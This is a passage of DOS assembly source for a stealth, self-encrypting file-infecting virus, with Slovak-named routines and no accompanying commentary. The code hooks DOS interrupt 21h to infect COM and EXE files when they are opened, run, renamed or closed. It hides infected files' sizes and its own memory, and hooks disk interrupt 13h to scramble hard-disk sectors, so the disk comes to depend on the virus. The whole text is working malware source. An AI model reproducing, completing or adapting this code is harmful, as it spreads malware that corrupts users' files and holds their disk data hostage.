	push	bx
	push	cx
	push	si
	push	di
	push	ds
	push	es
	push	ax
	mov	si,dx
	mov	di,OFFSET caname
	push	cs
	pop	es
	lea	bx,[di-1]
	mov	cx,DLZFNB
ol1:	lodsb
	cmp	al,'a'
	jb	nmp
	cmp	al,'z'
	ja	nmp
	sub	al,'a'-'A'	;uppercase
nmp:	push	ax
	push	si
nzero:	cmp	al,' '
	jne	nomdz
	lodsb
	or	al,al
	jnz	nzero		;no ending spaces
	pop	si
	pop	si
	jmp	short nstfn
nomdz:	pop	si
	pop	ax
	cmp	al,'\'
	je	stfn
	cmp	al,'/'
	je	stfn
	cmp	al,':'
	jne	nstfn
stfn:	mov	bx,di
nstfn:	stosb
	or	al,al
	jz	whname
	loop	ol1
whname:	mov	si,OFFSET retaz
	sub	di,5
	push	cs
	pop	ds

	call	Porovnaj
	je	porok
	call	Porovnaj
	jne	oinok		;is it COM or EXE ?

porok:	pop	ax
	push	ax
	xchg	di,bx
	inc	di
	cmp	ax,4b00h
	jne	nnchk
	mov	si,OFFSET retaz2
	call	Porovnaj
	jne	nnchk		;is it CHKDSK ?
	mov	byte ptr ds:(OFFSET dtrad+1),OFFSET dnxt-OFFSET con1

nnchk:	mov	cx,POCKRP
	mov	si,OFFSET retaz1
ol2:	push	cx
	call	Porovnaj
	pop	cx
	je	oinok
	loop	ol2		;check for critical programs

	mov	si,OFFSET caname
	xor	bl,bl
	lodsw
	cmp	ah,':'
	jne	imdrv
	sub	al,'A'-1
	mov	bl,al
imdrv:	mov	ax,4408h
	call	Int21
	or	ax,ax
vsetky:	jz	oiok		;removable (floppy like)
	mov	ax,4409h
	call	Int21
	jc	oinok
	test	dh,10h
	jnz	oiok		;in network
oinok:	stc
okon:	pop	ax
	pop	es
	pop	ds
	pop	di
	pop	si
	pop	cx
	pop	bx
	pop	dx
	ret
oiok:;	mov	ax,0e07h
;	int	10h
	clc
	jmp	okon
Over	ENDP
Porovnaj PROC	near
	push	di
	lodsb
	mov	cl,al
	mov	ax,si
	add	ax,cx
	repe	cmpsb
	mov	si,ax
	pop	di
	ret
Porovnaj ENDP

Identify PROC	near		;is file inf. ?
	push	dx
	mov	ax,es:[bx+2]
	xor	dx,dx
	div	cs:v30
	mov	ax,es:[bx]
	and	al,11111b
	cmp	al,dl
	stc
	je	iekon		;already infected
	mov	ax,es:[bx]
	and	ax,0ffe0h
	or	al,dl
	clc
iekon:	pop	dx
	ret
Identify ENDP

Subdlz	PROC	near
	sub	word ptr es:[bx],DLZVIR
	sbb	word ptr es:[bx+2],0
	jnc	npret
	add	word ptr es:[bx],DLZVIR
	adc	word ptr es:[bx+2],0
npret:	ret
Subdlz	ENDP
;************** TSR 21h part *************
Infname	PROC	near		;DS:DX = file name
	push	ax
	push	bx
	push	cx
	push	si
	push	di
	push	bp
	push	ds
	push	es
	call	Nastav24
	mov	ax,4300h
	call	Int21
	mov	cs:attrib,cx
	mov	ax,4301h
	xor	cx,cx
	call	Int21
	jc	err1
	mov	ax,3d02h
	call	Int21
	jc	err2
	push	dx
	push	ds
	push	cs
	pop	ds
	push	cs
	pop	es
	mov	handle,ax
	call	Infikuj
	mov	ah,3eh
	call	Mhandle
	pop	ds
	pop	dx
err2:	mov	ax,4301h
	DB	0b9h
attrib	DW	?		;mov	cx,attrib
	call	Int21
err1:	call	Vrat24
	pop	es
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	cx
	pop	bx
	pop	ax
	ret
Infname	ENDP

res21:	pushf
	sti
	cmp	ah,11h
	je	dtrad
	cmp	ah,12h
	jne	dnxt
dtrad:	jmp	short con1	;switched jump condition
con1:	push	bx
	push	es
	push	ax
	mov	ah,2fh
	call	Int21
	pop	ax
	call	Int21
	cmp	al,0ffh
	je	dterr
	push	ax
	cmp	byte ptr es:[bx],0ffh
	jne	nrozs
	add	bx,7
nrozs:	add	bx,17h
	call	Identify
	pop	ax
	jnc	dterr
	add	bx,1dh-17h
	call	Subdlz
dterr:	pop	es
	pop	bx
	popf
	iret
dnxt:	cmp	ah,4eh
	je	drozs
	cmp	ah,4fh
	jne	ndnxt
drozs:	push	bx
	push	es
	push	ax
	mov	ah,2fh
	call	Int21
	pop	ax
	call	Int21
	jc	droze
	push	ax
	add	bx,16h
	call	Identify
	pop	ax
	jnc	drozne
	add	bx,1ah-16h
	call	Subdlz
drozne:	pop	es
	pop	bx
	popf
	clc
	retf	2
droze:	pop	es
	pop	bx
	popf
	stc
	retf	2
ndnxt:	cmp	ax,4b53h
	jne	obrnxt
	mov	ax,454bh
	popf
	iret
obrnxt:	cmp	ah,4ch
	jne	nkprg
	mov	byte ptr cs:(OFFSET dtrad+1),0
nkprg:	cld
	push	dx
	cmp	ax,4b00h
        jne	nsppg
con3:	jmp	short miim
miim:	push	ax
	push	bx
	push	ds
	push	es
	mov	ah,52h
	call	Int21
	mov	ax,es:[bx-02h]
nmcb:	mov	ds,ax
	add	ax,ds:03h
	inc	ax
	cmp	byte ptr ds:00h,'Z'
	jne	nmcb
	mov	bx,cs
	cmp	ax,bx
	jne	cpch
	mov	byte ptr ds:00h,'M'
	xor	ax,ax
	mov	ds,ax
	add	word ptr ds:0413h,POCKIL	;memory look improvement
cpch:	mov	byte ptr cs:(OFFSET con3+1),OFFSET aiim-OFFSET miim
	pop	es
	pop	ds
	pop	bx
	pop	ax
aiim:	jmp	short infac
nsppg:	cmp	ah,3dh
	je	infac
;	cmp	ah,43h
;	je	infac
	cmp	ah,56h
	je	infac
	cmp	ax,6c00h
	jne	nxts
	test	dl,00010010b
	mov	dx,si
	jz	infac
	jmp	short saveh
nxts:	cmp	ah,3ch
	je	saveh
	cmp	ah,5bh
	je	saveh
	cmp	ah,3eh
	jne	jor21
	cmp	bx,cs:chandle
	jne	jor21
	or	bx,bx
	jz	jor21
	call	Int21
	jc	mirets
	push	ds
	push	cs
	pop	ds
	mov	dx,OFFSET fname
	call	Infname
	mov	chandle,0
	pop	ds
miretc:	pop	dx
	popf
	clc
	retf	2
jor21:	pop	dx
	popf
	jmp	cs:oriv21

infac:	call	Over
	jc	jor21
	call	Infname
	jmp	short jor21

saveh:	cmp	cs:chandle,0
	jne	jor21
	call	Over
	jc	jor21
	mov	cs:rhdx,dx
	pop	dx
	push	dx
	call	Int21
	db	0bah
rhdx	DW	?	;mov	dx,rhdx
	jnc	shok
mirets:	pop	dx
	popf
	stc
	retf	2
shok:	push	cx
	push	si
	push	di
	push	es
	xchg	si,dx
	mov	di,OFFSET chandle
	push	cs
	pop	es
	stosw
	mov	cx,DLZFNB
	rep	movsb
	pop	es
	pop	di
	pop	si
	pop	cx
	jmp	short miretc

	DB	'DidYouLeaveTheRoom?'
order	DW	1230            ;very important year :)
endvir	LABEL	near

Zakoduj	PROC 	near
	mov	cx,DLZVIR
	xor	dx,dx		;OFFSET stvir
	call	zp1
	mov	ah,40h
	mov	bx,handle
	pushf
	DB	9ah		;call	oriv21
oriv21	DD	?
	jc	zk1
	cmp	ax,cx
zk1:	pushf
	call	zp1
	popf
	ret
zp1:	push	cx
	mov	si,dx
zkmax:	mov	ax,0000h
	mov	cx,DLZVIR
zp2:	xor	[si],ax
zkaax:	add	ax,0000h
	inc	si
	loop	zp2
	pop	cx
	ret
Zakoduj	ENDP

res24:	mov	al,03h
	iret

Int13	PROC	near
	pushf
	call	cs:oriv13
	ret
Int13	ENDP
Tosi	PROC	near
	push	cx
	push	dx
	shr	cl,1
	shr	cl,1
	and	dh,11000000b
	or	dh,cl
	mov	cl,4
	shr	dh,cl
	mov	dl,ch
	xchg	si,dx
	pop	dx
	pop	cx
	ret
Tosi	ENDP
Skramb	PROC	near
	push	ax
	push	bx
	push	cx
	DB	0b0h		;mov	al,kolzak
kolzak	DB	?
	DB	0b8h		;mov	bx,odkzak
odkzak	DW	?
nxtss:	mov	cx,256
ls1:	xor	word ptr es:[bx],1212h
	inc	bx
	inc	bx
	loop	ls1
	dec	al
	jnz	nxtss
	pop	cx
	pop	bx
	pop	ax
	ret
Skramb	ENDP
res13:	cmp	ah,02h
	je	rtc
	cmp	ah,03h
	je	rtc
	jmp	jtoo
rtc:	cmp	dx,0080h
	jne	encode
	test	cx,0ffc0h
	jnz	encode
	push	bx
	push	dx
	push	si
	push	di
	push	cx
	push	cx
	mov	si,ax
	and	si,00ffh
	mov	di,si
	mov	al,01h
	push	ax
	jz	bzch		;if AL=0 do nothing
	jcxz	gchi
	cmp	cl,01h
	je	obbs
nxtsc:	cmp	cl,17		;if sector number > max. then error
	ja	gchi
r13ds:	cmp	cl,07h
	jb	ctoo
	cmp	ah,03h
	je	gchi
	push	bx
	mov	cx,512
flbf:	mov	byte ptr es:[bx],00h
	inc	bx
	loop	flbf
	pop	bx
rtcom:	add	bx,512
	pop	ax
	pop	cx
	inc	cx
	push	cx
	push	ax
	dec	si
	jnz	nxtsc
bzch:	clc
zav:	pop	ax
	pushf
	xchg	ax,di
	sub	ax,si
	popf
	mov	ah,ch
	pop	cx
	pop	cx
	pop	di
	pop	si
	pop	dx
	pop	bx
	retf	2
obbs:	mov	cl,byte ptr cs:(OFFSET r13ds+2)
ctoo:	call	Int13
	mov	ch,ah
	jc	zav
	jmp	rtcom
gchi:	stc
	mov	ch,0bbh		;undefined error
	jmp	zav

encode: cmp	dl,80h		;encoding resp. decoding
	jne	jtoo
	push	ax
	push	cx
	push	dx
	push	si
	push	ds
	push	cs
	pop	ds
	mov	kolzak,0
	mov	odkzak,bx
	call	Tosi
	and	cl,3fh
	and	dh,3fh
chdnd:	or	al,al
	jz	htvo
	cmp	si,1234h	;max. cyl.
	jae	htvo
cnflte:	cmp	si,1234h	;min. cyl.
	jb	tdal
	inc	kolzak
	jmp	short nxslp
tdal:	add	odkzak,512
nxslp:	dec	al
	inc	cl
	DB	80h,0f9h,?
	jbe	chdnd
	mov	cl,1
	inc	dh
	DB	80h,0feh,?
	jbe	chdnd
	xor	dh,dh
	inc	si
	jmp	chdnd
htvo:	cmp	kolzak,0
	pop	ds
	pop	si
	pop	dx
	pop	cx
	pop	ax
	je	jtoo
	cmp	ah,02h
	je	eckn
	call	Skramb
eckn:	call	zInt13
	pushf
	call	Skramb
	popf
	retf	2
jtoo:	DB	0eah
oriv13	DD	?

handle	DW	?
header	strc	<>
off24	DW	?
seg24	DW	?
ftime	DW	?
fdate	DW	?
chandle	DW	?
fname	DB	DLZFNB DUP(?)
ibuf	LABEL	byte		;variables for mutation
caname	DB	DLZFNB DUP(1)

endres	LABEL	near
Vkod	ENDS
	END 	start
